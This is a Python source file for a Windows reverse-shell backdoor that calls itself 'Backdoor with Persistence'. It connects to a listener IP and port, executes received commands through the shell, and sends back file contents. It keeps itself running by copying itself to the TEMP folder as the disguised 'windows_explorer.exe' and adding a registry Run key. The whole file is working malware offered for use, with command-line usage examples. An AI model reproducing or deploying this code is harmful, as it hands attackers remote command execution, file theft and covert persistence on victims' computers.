import socket
import subprocess
import json
import os
import sys
import shutil
import argparse
import time




def get_local_ip():
    """
    Get local IP address of the machine (works on Windows and Linux).
    Connects to an external server to discover the real IP (not localhost).
    """
    try:
        # Connect to an external DNS server (Google DNS)
        # This doesn't send actual data, just detects the local interface IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        # Fallback: try localhost
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            return ip
        except Exception:
            return "127.0.0.1"


class Backdoor:
    def __init__(self, ip, port):
        self.start_persistence()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._connect_with_loader(ip, port)

    def _connect_with_loader(self, ip, port):
        """Attempt to connect showing an interactive spinner until success"""
        spinner = ['|', '/', '-', '\\']
        idx = 0
        sys.stdout.write(f"[+] Connecting to {ip}:{port} ")
        sys.stdout.flush()
        while True:
            try:
                self.connection.connect((ip, port))
                break
            except Exception:
                sys.stdout.write(spinner[idx % len(spinner)])
                sys.stdout.flush()
                time.sleep(0.2)
                sys.stdout.write('\b')
                idx += 1
        sys.stdout.write("done\n")

        

    def change_working_directory_to(self,path):
        os.chdir(path)
        return "[+] Changing working directory to " + path
    
    def read_file(self, path):
        with open(path, "rb") as file:
            return file.read()

    def execute_system_command(self,command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)


    def start_persistence(self):
        print("[+] Start persistence")
        try:
            current_file = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
            temp_path = os.environ.get('TEMP', 'C:\\Windows\\Temp')
            destination_path = os.path.join(temp_path, 'windows_explorer.exe')
            print("[+] Start persistence part I")

            if not os.path.exists(destination_path) or os.path.abspath(current_file) != os.path.abspath(destination_path):
                shutil.copyfile(current_file, destination_path)
                print(f"File copy to path: {destination_path} ")
                
            reg_cmd = [
                'reg', 'add',
                r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
                '/v', 'windows_explorer',
                '/t', 'REG_SZ',
                '/d', f'"{destination_path}"',
                '/f'
            ]

            result = subprocess.run(
                reg_cmd,
                capture_output=True,
                text=True,
                shell=True
            )

            if result.returncode == 0:
                print("Sucess!")
            else:
                print(f"Error: {result.stderr}")


        except Exception as e:
            print(f"Error to persistence: {e}")
    

    def run(self):
        self.start_persistence()
        try:
            while True:
                command = self.connection.recv(1024).decode()
                data = json.loads(command)

                if data[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif data[0] == 'cd' and len(data) > 1:
                    command_result = self.change_working_directory_to(data[1])
                elif data[0] == 'download' and len(data) > 1:
                    command_result = self.read_file(data[1])
                else:
                    command_result = self.execute_system_command(data)
                
                if isinstance(command_result, str):
                    command_result = command_result.encode()

                self.connection.send(command_result)
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user, closing connection")
            try:
                self.connection.close()
            except:
                pass
            sys.exit()


def print_skull():
    """Print a skull made of bytes"""
    skull_bytes = bytes([
        32,32,32,32,46,45,46,10,
        32,32,32,40,111,32,111,41,10,
        32,32,32,124,32,79,32,92,10,
        32,32,32,32,92,32,32,32,92,10,
        32,32,32,32,96,126,126,126,39,10
    ])
    # decode assuming ascii
    sys.stdout.write(skull_bytes.decode('ascii'))
    sys.stdout.write("\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Backdoor with Persistence - Connect to listener and maintain access",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python backdoor-and-persistence.py                      # Auto IP, connects to localhost:4444
  python backdoor-and-persistence.py -i auto -p 5555      # Auto IP, custom port
  python backdoor-and-persistence.py -i 192.168.1.100 -p 4444
        """
    )
    
    parser.add_argument(
        "-i", "--ip",
        type=str,
        default="auto",
        help="IP address of the listener (default: auto detects local IP)"
    )
    
    parser.add_argument(
        "-p", "--port",
        type=int,
        default=4444,
        help="Port of the listener (default: 4444)"
    )
    
    args = parser.parse_args()
    ip = args.ip
    if ip.lower() == "auto":
        ip = get_local_ip()

    print_skull()
    print("[+] Starting backdoor with persistence")
    try:
        my_backdoor = Backdoor(ip, args.port)
        my_backdoor.run()
    except KeyboardInterrupt:
        print("\n[!] User requested shutdown")
        try:
            my_backdoor.connection.close()
        except:
            pass
        sys.exit()
    except Exception as e:
        print("Error ", e)
        sys.exit()

            